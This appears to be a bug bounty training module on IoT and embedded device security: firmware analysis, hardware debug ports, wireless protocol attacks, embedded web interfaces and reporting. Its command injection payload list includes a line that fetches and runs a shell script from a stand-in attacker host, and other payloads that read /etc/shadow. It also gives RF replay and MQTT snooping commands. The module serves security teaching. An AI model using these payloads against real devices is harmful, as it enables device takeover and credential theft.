IoT & Embedded Systems

Bug Hunting • Module 13 • Hardware Attack Surface

The Internet of Things has expanded the attack surface of every organization that deploys connected devices — from smart cameras and industrial sensors to medical equipment and building automation systems. IoT security testing combines skills from firmware reverse engineering, hardware hacking, wireless protocol analysis, and traditional web application testing into a discipline that very few researchers practice well. The devices themselves often run stripped-down Linux distributions with minimal security controls, expose debug interfaces from the factory, and communicate over wireless protocols with weak or nonexistent encryption. This module builds the methodology for assessing IoT devices from firmware extraction through wireless protocol exploitation to reporting vulnerabilities with real-world impact.

Section 01

📡 IoT Bug Bounty Programs

IoT bug bounty programs differ fundamentally from web application programs in their scope, methodology, and disclosure expectations. Testing physical hardware introduces considerations that do not exist in web testing: you may need to purchase the device with your own funds, testing may require physical modifications that void warranties, and findings may affect devices deployed in safety-critical environments like hospitals or power grids. Despite these challenges, IoT bounty programs are among the most rewarding for skilled researchers because the competition is thin and the severity of findings tends to be high.

  • › Hardware modification may be necessary (soldering, UART)

Safety-Critical Devices
IoT vulnerabilities in medical devices, industrial control systems, and automotive components can have life-safety implications. If you discover a vulnerability in a pacemaker, an insulin pump, a building fire suppression system, or a vehicle control module, do not disclose it publicly under any circumstances before the manufacturer has released a patch. Work through CISA's ICS-CERT, the FDA (for medical devices), or the manufacturer's coordinated disclosure program. The stakes are fundamentally different from finding an XSS in a web application.
Section 02

Firmware Extraction & Analysis

Firmware is the software that runs on embedded devices — typically a minimal Linux distribution or a real-time operating system with the device's application code, web server, configuration files, and sometimes an entire filesystem packed into a single binary image. Extracting and analyzing firmware is the foundation of IoT security research. A thorough firmware analysis can reveal hardcoded credentials, backdoor accounts, encryption keys, vulnerable services, and the entire architecture of the device's software stack before you ever connect to the physical hardware.

Obtaining Firmware

Firmware can be obtained through several methods, ranging from trivial downloads to hardware-level extraction. Always start with the easiest approach — many manufacturers publish firmware updates on their support websites, making physical extraction unnecessary.

Manufacturer Downloads
Check the manufacturer's support page for firmware update files. These are often .bin, .img, or .zip files. Some are encrypted, but many are plain filesystem images. Search Google for site:manufacturer.com firmware download.
UART Shell Access
Connect to the device's UART debug port to access a serial console. From a root shell, you can dump the firmware directly from flash memory using dd or read it from the filesystem. This requires identifying and soldering to UART pads on the PCB.
📌
SPI Flash Extraction
Desolder or clip onto the SPI flash chip and read its contents directly using a programmer like a Bus Pirate, Flashrom-compatible adapter, or CH341A. This provides the raw firmware image regardless of any runtime protections the device implements.
Network Capture
Intercept firmware update traffic between the device and the manufacturer's update server. If the update is downloaded over HTTP or HTTPS without certificate pinning, the firmware image can be captured with a proxy.

Firmware Analysis with Binwalk

Binwalk is the standard tool for analyzing firmware images. It scans binary files for known file signatures — filesystem headers, compressed archives, bootloader code, and embedded files — and can extract the contents automatically. A typical IoT firmware image contains a bootloader (often U-Boot), a Linux kernel, and a root filesystem (squashfs, JFFS2, or cramfs).

# Scan firmware for embedded file signatures binwalk firmware.bin # Extract all identified components binwalk -e firmware.bin # Recursive extraction (extract within extracted files) binwalk -eM firmware.bin # Entropy analysis (detect encryption or compression) binwalk -E firmware.bin # Flat high entropy = likely encrypted # Varying entropy with drops = compressed filesystem regions

Filesystem Analysis

Once the filesystem is extracted, the analysis follows a systematic pattern: search for credentials, configuration files, web application code, startup scripts, and cryptographic material. The filesystem of a typical IoT device is remarkably transparent compared to a hardened server — developers frequently leave debug scripts, default credentials, and API keys in the firmware because they assume the binary is opaque to end users.

# Search for hardcoded credentials grep -rn "password\|passwd\|pwd\|secret" ./squashfs-root/ # Check /etc/shadow and /etc/passwd cat ./squashfs-root/etc/shadow cat ./squashfs-root/etc/passwd # Search for private keys and certificates find ./squashfs-root/ -name "*.pem" -o -name "*.key" -o -name "*.crt" # Examine startup scripts for services and configuration ls ./squashfs-root/etc/init.d/ cat ./squashfs-root/etc/init.d/rcS # Check for web application files find ./squashfs-root/ -name "*.cgi" -o -name "*.lua" -o -name "*.php" # Look for hardcoded API endpoints and URLs grep -rn "http://\|https://\|api\.\|\.amazonaws\.com" ./squashfs-root/

Entropy Analysis

Binwalk's entropy analysis (-E flag) visualizes the randomness distribution across the firmware image. Regions of high, uniform entropy indicate encryption or strong compression. Regions with structured entropy patterns indicate filesystems, code, or data. A firmware image that shows flat high entropy across its entirety is likely encrypted — you will need the decryption key (often found in the bootloader or a previous firmware version) before analysis can proceed.

ℹ
Firmware Emulation
Tools like QEMU and Firmadyne can emulate extracted firmware images, allowing you to interact with the device's web interface and services without physical hardware. This is particularly valuable for testing command injection in web interfaces and API endpoints. Firmadyne automates the process of identifying the architecture (MIPS, ARM, etc.), setting up the QEMU environment, and configuring networking for the emulated device.
Section 03

Hardware Interfaces

Most embedded devices retain hardware debug interfaces from their development and manufacturing process. UART serial ports, JTAG debug headers, and SPI/I2C bus connections are frequently left accessible on production PCBs because removing them adds cost to the manufacturing process. These interfaces provide direct access to the device's internals — serial console shells, memory dumps, and flash chip contents — bypassing any software-level security the device implements.

UART Identification and Connection

UART (Universal Asynchronous Receiver-Transmitter) is the most common debug interface on IoT devices. It provides a serial console that typically outputs boot logs and, in many cases, drops directly to a root shell. Identifying UART pads on a PCB requires visual inspection for groups of 3-4 exposed pads or pins, often labeled TX, RX, GND, and VCC.

# UART identification process: # 1. Open the device case and photograph the PCB # 2. Look for groups of 3-4 pads/pins (TX, RX, GND, VCC) # 3. Use a multimeter to identify GND (continuity with ground plane) # 4. Use a logic analyzer to identify TX (transmits data on boot) # 5. The remaining data pad is RX # Connect with a USB-to-UART adapter (FTDI, CP2102, etc.) # Common baud rates: 9600, 19200, 38400, 57600, 115200 # Connect using screen screen /dev/ttyUSB0 115200 # Connect using minicom minicom -D /dev/ttyUSB0 -b 115200 # Auto-detect baud rate with baudrate.py python3 baudrate.py -p /dev/ttyUSB0

What UART Reveals

A successful UART connection typically provides the complete boot sequence output, including the bootloader (U-Boot) menu, kernel boot messages, and service initialization. Many devices drop directly to a root shell without authentication. Even when a login prompt appears, the credentials are frequently found in the firmware's /etc/shadow file or are the manufacturer's default credentials.

✔
U-Boot Interrupt
Many devices use U-Boot as their bootloader. During the boot sequence, there is typically a brief window (1-3 seconds) where pressing a key (often Enter, Space, or a specific key combination) drops you into the U-Boot command prompt. From there, you can modify boot arguments, read flash memory, boot into single-user mode, or change the root password before the OS loads. Look for messages like "Hit any key to stop autoboot" during the boot output.

JTAG Debugging

JTAG (Joint Test Action Group) provides a more powerful hardware debug interface than UART. While UART gives you a serial console, JTAG provides processor-level debugging — you can halt the CPU, read and write memory, set breakpoints, and step through code instruction by instruction. JTAG access is the hardware equivalent of attaching a debugger to a running process.

Interface Access Level Required Hardware Common Use in Bug Bounty
UART Serial console (shell access) USB-to-UART adapter ($5-15) Boot log capture, root shell access, credential discovery
JTAG Processor-level debugging JTAG adapter (J-Link, Bus Pirate) ($20-300) Memory extraction, firmware dumping, bypassing secure boot
SPI Flash chip read/write SPI programmer (CH341A, Bus Pirate) ($5-30) Direct firmware extraction from flash memory
I2C EEPROM and sensor access Logic analyzer or Bus Pirate ($10-30) Reading configuration EEPROMs, sensor calibration data

SPI Flash Reading

# Read SPI flash using flashrom with CH341A programmer flashrom -p ch341a_spi -r flash_dump.bin # Identify the flash chip first flashrom -p ch341a_spi # Output: Found Winbond flash chip "W25Q64" (8192 kB) # Read with Bus Pirate flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r flash_dump.bin # Analyze the dump with binwalk binwalk -eM flash_dump.bin

Logic Analyzer Usage

A logic analyzer captures digital signals on hardware buses, allowing you to decode communication protocols in real time. When you cannot identify the baud rate of a UART connection, when you need to sniff I2C or SPI traffic between chips on the PCB, or when you want to capture the communication between the device's main processor and its wireless module, a logic analyzer makes the invisible visible. Affordable USB logic analyzers (Saleae Logic clones, around $10-15) handle most IoT debugging tasks.

Section 04

📡 Wireless Protocol Attacks

IoT devices communicate over a variety of wireless protocols, each with its own security model and attack surface. While Wi-Fi security is relatively mature, protocols designed specifically for IoT — BLE, Zigbee, Z-Wave, and various proprietary RF implementations — often prioritize low power consumption and simplicity over security. These protocols operate in frequency bands that can be monitored with inexpensive software-defined radios, and their security implementations frequently contain weaknesses that have been known for years but never patched because of the cost of updating deployed devices.

BLE (Bluetooth Low Energy)

Bluetooth Low Energy is the most common wireless protocol in consumer IoT devices. Smart locks, fitness trackers, medical devices, and home automation products all use BLE for communication with mobile apps. BLE's security model supports pairing with encryption, but many devices implement "Just Works" pairing (no PIN, no authentication) or communicate sensitive data over unencrypted GATT characteristics.

# Scan for BLE devices sudo hcitool lescan # Connect and enumerate services/characteristics gatttool -b AA:BB:CC:DD:EE:FF -I [AA:BB:CC:DD:EE:FF][LE]> connect [AA:BB:CC:DD:EE:FF][LE]> primary # List services [AA:BB:CC:DD:EE:FF][LE]> characteristics # List characteristics [AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0025 # Read a value # Using bettercap for BLE enumeration sudo bettercap >> ble.recon on >> ble.enum AA:BB:CC:DD:EE:FF

BLE Attack Patterns

Sniffing & Replay
Capture BLE communication between a device and its mobile app using a sniffer (Ubertooth, nRF52840 dongle). If commands are sent in plaintext or use static tokens, replay them to control the device without the legitimate app.
MITM Attacks
Position yourself between the device and the mobile app during the pairing process. "Just Works" pairing is vulnerable to MITM because neither party authenticates the other. Tools like GATTacker facilitate BLE MITM attacks.
🔃
Fuzzing GATT Services
Write unexpected values to writable GATT characteristics. Many devices have minimal input validation on BLE commands, leading to crashes, buffer overflows, or unintended behavior when receiving malformed data.
Static Key Analysis
Extract the BLE pairing key or application-layer authentication token from the mobile app's source code or the device firmware. Many devices use hardcoded or predictable keys that are shared across all units of the same product.

Zigbee and Z-Wave

Zigbee and Z-Wave are mesh networking protocols used primarily in home automation — smart lighting, door locks, thermostats, and security sensors. Both protocols support encryption, but implementation weaknesses are common. Zigbee networks have been shown to be vulnerable to key extraction during the pairing process, and Z-Wave S0 security (the predecessor to the current S2 standard) uses a known, fixed key for the initial key exchange.

# Zigbee sniffing with KillerBee and an Atmel RZ RAVEN USB stick zbstumbler # Lists Zigbee networks and their channels zbdump -c 15 -w zigbee_capture.pcap # Capture Zigbee traffic on channel 15 # Analyze capture in Wireshark with Zigbee dissector wireshark zigbee_capture.pcap # Z-Wave sniffing requires Z-Wave USB stick (e.g., Sigma UZB) # Tools: Scapy-radio, EZ-Wave, Z-Wave sniffer firmware

SDR Basics for IoT Testing

Software-Defined Radio (SDR) enables testing of proprietary wireless protocols that do not use standard Bluetooth, Wi-Fi, or Zigbee. Many IoT devices — garage door openers, wireless doorbells, key fobs, remote sensors — communicate on ISM bands (315 MHz, 433 MHz, 868 MHz, 915 MHz) using simple OOK (On-Off Keying) or FSK (Frequency Shift Keying) modulation with no encryption. These signals can be captured and replayed with an inexpensive RTL-SDR dongle ($20) for reception or a HackRF One ($300) for transmission.

# Capture RF signals with rtl_433 rtl_433 -f 433920000 -S all # Records all signals detected at 433.92 MHz # Analyze signals with Universal Radio Hacker (URH) urh # GUI tool for recording, demodulating, and analyzing RF signals # Replay captured signals with HackRF hackrf_transfer -t captured_signal.raw -f 433920000 -s 2000000
Legal Considerations
Transmitting on radio frequencies is regulated by law in every country. Using an SDR to receive and analyze signals is generally legal. Transmitting — including replaying captured signals — may require a license depending on the frequency, power level, and your jurisdiction. Never transmit on frequencies used by emergency services, aviation, or maritime communication. For bug bounty testing, document your capture and analysis methodology and consult local regulations before any transmission.
Section 05

Embedded Web Interfaces

Nearly every IoT device ships with a web-based management interface. These interfaces are built with constrained resources — limited memory, slow processors, and small development teams — which leads to security shortcomings that would be unacceptable in a modern web application. The web servers are typically lightweight implementations (lighttpd, mini_httpd, GoAhead, or custom C-based servers) running CGI scripts written in C, Lua, or shell script. The combination of a simple web server with native code CGI handlers is a recipe for command injection, buffer overflows, and authentication bypasses.

Common Web Vulnerabilities in IoT

Vulnerability Prevalence in IoT Root Cause Typical Impact
Command Injection Very High CGI scripts passing user input to system() or popen() without sanitization Root shell on the device
Default Credentials Very High Hardcoded or predictable admin passwords, often the same across all devices of a model Full device compromise
Authentication Bypass High Broken session management, direct URL access to admin pages, path traversal past auth checks Unauthenticated admin access
Buffer Overflow High C-based CGI handlers with fixed-size buffers and no bounds checking Code execution, denial of service
Information Disclosure High Debug pages, configuration dumps, hardware serial numbers exposed without auth Credential leakage, network mapping

Command Injection in IoT Web Interfaces

Command injection is the most common critical vulnerability in IoT web interfaces. Device management functions like ping, traceroute, DNS lookup, and firmware update are implemented by passing user-supplied input directly to shell commands. The input reaches a call like system("ping -c 4 " + user_input) without any sanitization, allowing an attacker to append arbitrary commands.

# Common command injection test payloads for IoT # In ping/traceroute/diagnostic fields: 192.168.1.1; id 192.168.1.1 && cat /etc/shadow 192.168.1.1 | ls -la / $(whoami) `id` # In filename/path fields (firmware upload, config import): file.cfg; wget http://attacker.com/shell.sh -O /tmp/s; sh /tmp/s # In network configuration fields (hostname, NTP server): attacker.com; id $(cat /etc/passwd)

Default Credentials at Scale

The default credential problem in IoT is systemic. Unlike web applications where each deployment gets a unique initial password, IoT devices ship with identical credentials across every unit of the same model. Manufacturers use credentials like admin/admin, root/root, or device-specific defaults that are documented in publicly available user manuals. Some devices generate passwords from the device's MAC address or serial number, which are discoverable through the web interface itself.

Default Credential Databases
Resources for finding manufacturer default passwords
▼

Several databases catalog default credentials for IoT and network devices:

  • cirt.net — One of the oldest default password databases, covering routers, cameras, printers, and industrial equipment
  • datarecovery.com/rd/default-passwords — Searchable database organized by manufacturer
  • Manufacturer documentation — User manuals and quick-start guides frequently list default credentials in plain text
  • Shodan — Device banners often reveal the manufacturer and model, which maps to known defaults

In a bug bounty context, demonstrating that a device uses default or hardcoded credentials that cannot be changed by the user is a valid finding. Devices that generate passwords from predictable inputs (MAC address, serial number) without using a cryptographically secure derivation function are also vulnerable, as these inputs are often disclosed by the device itself.

Firmware Update Mechanisms

The firmware update process is a critical attack surface. If a device downloads firmware updates over HTTP (not HTTPS), does not verify the cryptographic signature of the firmware image, or accepts firmware from any source without server authentication, an attacker on the same network can serve a malicious firmware image to the device during the update process. This is a complete device compromise — the attacker controls every aspect of the device's software stack.

  • No HTTPS — Firmware downloaded over cleartext HTTP is trivially interceptable on the local network.
  • No signature verification — The device installs any firmware image without checking a cryptographic signature against a known public key.
  • Rollback attacks — The device accepts older firmware versions, allowing downgrade to a version with known vulnerabilities.
  • Update server spoofing — The device does not validate the identity of the update server, accepting firmware from any host that responds.
Section 06

IoT Network Protocols

IoT devices use specialized network protocols designed for constrained environments. These protocols prioritize low bandwidth, small packet sizes, and minimal processing overhead. The security implications are significant — the protocols were designed with the assumption that they would operate on trusted networks, but IoT deployments increasingly bridge these protocols to the public internet through cloud gateways and brokers.

MQTT (Message Queuing Telemetry Transport)

MQTT is the dominant protocol for IoT messaging. It uses a publish/subscribe model where devices publish messages to topics on a broker, and other devices or services subscribe to those topics to receive messages. The security model depends entirely on broker configuration — many MQTT brokers are deployed with no authentication, allowing anyone to subscribe to all topics (including those carrying sensor data, control commands, and credentials) or publish messages that control physical devices.

# Discover MQTT brokers via Shodan # "MQTT" port:1883 org:"Target Corp" # Connect to an MQTT broker without credentials mosquitto_sub -h broker.target.com -t "#" -v # "#" subscribes to ALL topics # "-v" shows topic names alongside messages # Subscribe to specific topic patterns mosquitto_sub -h broker.target.com -t "devices/+/status" -v mosquitto_sub -h broker.target.com -t "$SYS/#" -v # $SYS topics contain broker statistics and metadata # Publish a test message (exercise extreme caution) mosquitto_pub -h broker.target.com -t "test/topic" -m "test"
Never Publish to Production MQTT Brokers
An unauthenticated MQTT broker that controls physical devices (door locks, HVAC systems, industrial valves) creates a direct path from a network vulnerability to physical-world consequences. In a bug bounty context, never publish messages to production MQTT topics. Subscribe to demonstrate read access, document the topic structure and message formats to prove you understand the control plane, and report the finding with a clear explanation of the potential impact. A published message to the wrong topic could cause physical damage or endanger people.

CoAP (Constrained Application Protocol)

CoAP is a lightweight protocol designed for constrained IoT devices, operating over UDP rather than TCP. It follows a REST-like model (GET, POST, PUT, DELETE) similar to HTTP but with significantly smaller overhead. CoAP uses port 5683 by default and supports DTLS for encryption, though many deployments omit it. Unauthenticated CoAP endpoints can be discovered and queried with the coap-client tool.

# Query a CoAP endpoint coap-client -m get coap://target:5683/.well-known/core # Lists all available CoAP resources # Read sensor data coap-client -m get coap://target:5683/sensors/temperature # Shodan discovery # "CoAP" port:5683

UPnP/SSDP and mDNS

Universal Plug and Play (UPnP) and its discovery protocol SSDP (Simple Service Discovery Protocol) allow devices to automatically discover and interact with each other on local networks. UPnP is notorious for security issues: it allows devices to open ports on routers (via IGD), expose service descriptions (XML files describing device capabilities and control URLs), and in many cases accept unauthenticated SOAP commands to control device functions.

# Discover UPnP devices on the local network gssdp-discover --timeout=5 # Alternative: use upnpc upnpc -l # Discover mDNS services (Bonjour/Avahi) avahi-browse -a -t # Resolve specific mDNS names avahi-resolve -n device.local # Check for UPnP XML descriptions curl -s http://192.168.1.1:49152/rootDesc.xml

Section 07

IoT Testing Methodology

A complete IoT security assessment requires integrating hardware analysis, firmware reverse engineering, network protocol testing, and web application testing into a coherent workflow. The methodology below covers both remote-only testing (when you only have network access to the device) and physical testing (when you have the device on your workbench).

Complete IoT Assessment Workflow

  1. Reconnaissance. Identify the device manufacturer, model, firmware version, and chipset. Check for published firmware updates, user manuals, FCC filings (which often include internal PCB photos), and known CVEs for the device or its components.
  2. Firmware acquisition and analysis. Download or extract firmware. Use binwalk for extraction, grep for hardcoded credentials, analyze the web application code, and identify the runtime services and their configurations.
  3. Hardware interface identification. If you have physical access, open the case and photograph the PCB. Identify UART, JTAG, and SPI pads. Connect to UART and capture boot logs. Attempt to get a shell.
  4. Network service enumeration. Scan the device for open ports and running services. Identify the web server, MQTT broker, telnet/SSH, UPnP, and any custom services. Document each service and its version.
  5. Web interface testing. Test the web management interface for command injection, authentication bypass, default credentials, path traversal, and information disclosure. Focus on diagnostic functions and configuration import/export features.
  6. Protocol analysis. Test MQTT, CoAP, UPnP, and any proprietary protocols for authentication weaknesses and unauthorized access. Capture and analyze wireless communications if applicable.
  7. Firmware update testing. Analyze the update mechanism for HTTPS usage, signature verification, rollback protection, and update server authentication.
  8. Cloud backend assessment. Test the cloud APIs that the device communicates with for IDOR, broken authentication, and unauthorized access to other users' devices.
  9. Report with impact. Document each finding with device model, firmware version, hardware revision, and clear reproduction steps. Explain the physical-world impact of each vulnerability.

Reporting IoT Vulnerabilities

IoT vulnerability reports require additional context beyond standard web findings. The report must enable the manufacturer to reproduce the issue with a specific device and firmware version, understand the physical-world impact, and prioritize the fix within their firmware update cycle. Include the following:

  • Device identification: Manufacturer, model number, hardware revision (often printed on the PCB), and exact firmware version string.
  • Attack prerequisites: Network access only? Physical access required? Specific wireless range? Authentication needed?
  • Physical-world impact: A command injection on a smart lock is different from a command injection on a temperature sensor. Describe what the attacker can do to the physical device and its users.
  • Scale of impact: How many devices are affected? Is the vulnerability in a shared firmware across a product line? Can it be exploited remotely across the internet or only on the local network?
  • Remediation complexity: Does fixing this require a firmware update pushed to all deployed devices? Is there a workaround available to users?
Common High-Impact IoT Findings
Vulnerabilities that consistently receive high severity ratings
▼
  1. Hardcoded root credentials — Same root password across all devices of a model, discoverable in the firmware. Cannot be changed by the user.
  2. Command injection in web interface — Diagnostic tools (ping, traceroute) or configuration fields that pass input to shell commands without sanitization.
  3. Unsigned firmware updates — Device accepts any firmware image without cryptographic verification, enabling malicious firmware installation.
  4. Unauthenticated MQTT broker — Device control messages published to a broker with no authentication, allowing any network participant to control the device.
  5. Shared TLS private keys — The same TLS private key embedded in firmware across all devices, allowing any researcher who extracts it to decrypt traffic from any unit.
  6. UART root shell without authentication — Debug serial port provides immediate root access with no login required. Physical access only, but demonstrates lack of hardware security design.
  7. Cloud API IDOR — The cloud backend that manages the device allows accessing other users' devices by changing device IDs in API requests.
  8. BLE replay attacks on smart locks — Capturing and replaying BLE unlock commands that use static or predictable tokens.
